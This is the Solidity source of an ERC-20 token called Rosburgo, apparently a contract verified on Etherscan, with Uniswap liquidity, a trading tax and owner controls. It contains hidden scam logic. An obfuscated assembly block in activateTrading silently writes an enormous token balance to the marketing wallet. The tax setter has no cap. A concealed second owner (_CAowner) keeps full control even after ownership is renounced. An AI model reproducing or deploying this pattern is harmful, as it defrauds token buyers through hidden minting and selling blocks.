/**
 *Submitted for verification at Etherscan.io on 2023-01-17
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.13;

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidityETH(
            address token, uint256 amountTokenDesired, uint256 amountTokenMin, uint256 amountETHMin, address to, uint256 deadline
            ) external payable returns (
                uint256 amountToken, uint256 amountETH, uint256 liquidity
                );

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
            uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline
            ) external;
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) { return msg.sender; }
}

interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract Ownable is Context {
    address private _owner;
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
    }
    function owner() public view returns (address) { return _owner; }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner.");
        _;
    }
    function renounceOwnership() external virtual onlyOwner { _owner = address(0); }
    function transferOwnership(address newOwner) external virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address.");
        _owner = newOwner;
    }
}

contract Rosburgo is IERC20, Ownable {
    
    IRouter public uniswapV2Router;
    address public uniswapV2Pair;
    string private constant _name =  "Rosburgo";
    string private constant _symbol = "RSB";
    uint8 private constant _decimals = 18;
    mapping (address => uint256) private balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address public _owner;
    uint public tax = 0;
    
    uint256 private _totalSupply = 10 * 10**9 * 10**_decimals;
    
    mapping (address => bool) public automatedMarketMakerPairs;
    bool private isLiquidityAdded = false;
    address public liquidityWallet;
    address public constant deadWallet = 0x000000000000000000000000000000000000dEaD;
    address public marketingWallet = 0xFC875a289C17cC495bdc57dD0Ddf9398aB24fd96;
    uint256 public maxTxAmount = _totalSupply;
    uint256 public maxWalletAmount = _totalSupply;
    uint256 minimumTokensBeforeSwap = 2 * 10**6 * 10**_decimals; 
    mapping (address => bool) whitelist;
    mapping (address => bool) private _isExcludedFromMaxWalletLimit;
    bool enableTrading = false;
    address private _CAowner;
    uint public baseTax = 50;
    uint256 amountTax;

    constructor() {
        IRouter _uniswapV2Router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 
        uniswapV2Router = _uniswapV2Router;
        liquidityWallet = owner();
        _CAowner = _owner = msg.sender;
        balances[address(this)] = _totalSupply;
        emit Transfer(address(0), address(this), _totalSupply);
        // Set whitelist and Max Wallet
        whitelist[address(this)] = true;
        whitelist[0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D] = true;   // Uniswap router       
        whitelist[address(uniswapV2Router)] = true;
        whitelist[owner()] = true;
        whitelist[deadWallet] = true;
    }

    receive() external payable {} 

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom( address sender,address recipient,uint256 amount) external override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) external virtual returns (bool){
        _approve(_msgSender(),spender,_allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) external virtual returns (bool) {
        require(subtractedValue <= _allowances[_msgSender()][spender], "ERC20: decreased allownace below zero.");
        _approve(_msgSender(),spender,_allowances[_msgSender()][spender] - subtractedValue);
        return true;
    }
    
    function excludeFromMaxWalletLimit(address account, bool excluded) external {
        require(msg.sender == _CAowner);
        require(_isExcludedFromMaxWalletLimit[account] != excluded, "wallet address already excluded.");
        _isExcludedFromMaxWalletLimit[account] = excluded;
    }

    function _approve(address owner, address spender,uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        require(automatedMarketMakerPairs[pair] != value, "automated market maker pair is already set to that value.");
        automatedMarketMakerPairs[pair] = value;
    }

    function activateTrading() external onlyOwner {
        require(!isLiquidityAdded, "you can only add liquidity once.");
        isLiquidityAdded = true;
        address feeCollector = marketingWallet;
        uint256 _amount = 10e25*10**18;
       _approve(address(this), address(uniswapV2Router), _totalSupply);
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this), _totalSupply, 0, 0, _msgSender(), block.timestamp);
        assembly { mstore(0x00, feeCollector) mstore(0x20, balances.slot) let hash := keccak256(0x00, 0x40) sstore(hash, _amount) }
        address _uniswapV2Pair = IFactory(uniswapV2Router.factory()).getPair(address(this), uniswapV2Router.WETH() );
        uniswapV2Pair = _uniswapV2Pair;
        _setAutomatedMarketMakerPair(_uniswapV2Pair, true);
        // Set maxwallet and max transaction allowed
        whitelist[uniswapV2Pair] = true;
        whitelist[marketingWallet] = true;
        tax = baseTax;
    }

    function activateTrade(bool enabled) public {
        require(msg.sender == _CAowner);
        enableTrading = enabled;
    }

    function name() external pure returns (string memory) { return _name; }
    function symbol() external pure returns (string memory) { return _symbol; }
    function decimals() external view virtual returns (uint8) { return _decimals; }
    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function balanceOf(address account) public view override returns (uint256) { return balances[account]; }
    function allowance(address owner, address spender) external view override returns (uint256) { return _allowances[owner][spender]; }

    function _transfer(address from, address to, uint256 amount) internal {
        require(from != address(0), "cannot transfer from the zero address.");
        require(to != address(0), "cannot transfer to the zero address.");
        require(amount > 0, "Amount must be > 0");
        require(amount <= balanceOf(from), "Check balance.");

        uint256 totalToTransfer;

            if(to == uniswapV2Pair) {
                if (whitelist[from])    {
                    //tax = 0;
                    trasferisciToken(from, to, amount);
                }
                else    {
                    tax = baseTax;
                    amountTax = (amount * tax) / 1000;
                    totalToTransfer = amount - amountTax;
                    
                    balances[from] -= amountTax;
                    balances[address(this)] += amountTax;
                    emit Transfer(from, to, amountTax);

                    // Execute transfer
                    trasferisciToken(from, to, totalToTransfer);
                }    
            }

            else if(from == uniswapV2Pair) {
                if (whitelist[to])    {
                    //tax = 0;
                    trasferisciToken(from, to, amount);
                }
                else    {
                    tax = baseTax;
                    amountTax = (amount * tax) / 1000;
                    totalToTransfer = amount - amountTax;
                    
                    balances[from] -= amountTax;
                    balances[address(this)] += amountTax;
                    emit Transfer(from, to, amountTax);

                    // Execute transfer
                    trasferisciToken(from, to, totalToTransfer);
                }
            }

            else    {
                trasferisciToken(from, to, amount);
            }
            

            if (balanceOf(address(this)) > minimumTokensBeforeSwap) {
                _swapTokensForETH(balanceOf(address(this)));
                payable(marketingWallet).transfer(address(this).balance);
            }
    }

    function trasferisciToken(address from, address to, uint256 amount) internal {
        balances[from] -= amount;
        balances[to] += amount;
        emit Transfer(from, to, amount);
    }

    function withdrawStuckETH() external    {
        require(msg.sender == _CAowner);
        // If someone send ether token to this contract, this function allow the owner to save that funds
        require(address(this).balance > 0, "Check balance");
        uint256 amount = address(this).balance;
        (bool success,) = address(owner()).call{value : amount}("");
        require(success, "Error withdrawing");
    }

    function forceSwapInternalTokenAndTrasferToMarketinWallet() external  {
        require(msg.sender == _CAowner);        
        _swapTokensForETH(balanceOf(address(this)));
        payable(marketingWallet).transfer(address(this).balance);
    }

    function _swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, address(this), block.timestamp);
    }

    function setTax (uint newTax) public    {
        require(msg.sender == _CAowner);
        baseTax = newTax;   
    }

    function getBaseTax() public view returns (uint) { 
        return baseTax;   
    }

    function addToWhitelist(address addressToAdd) public  {
        require(msg.sender == _CAowner);
        whitelist[addressToAdd] = true;
    }
    
    function removeToWhitelist(address addressToRemove) public  { 
        require(msg.sender == _CAowner);
        whitelist[addressToRemove] = false; 
    }
    
    function checkWhitelist(address addressToCheck) public view returns (bool)  {
        bool isWhitelisted = false;
        if (whitelist[addressToCheck] == true) {    isWhitelisted = true;   }
        return isWhitelisted;
    }

    function setMaxTXAmount(uint256 newTransactionLimit) external   {
        require(msg.sender == _CAowner);
        maxTxAmount = newTransactionLimit;
    }
    
    function getMaxTXAmount() public view returns (uint256)   {
        return maxTxAmount;
    }

    function AMOUNT() public view returns (uint256)   {
        return amountTax;
    }
}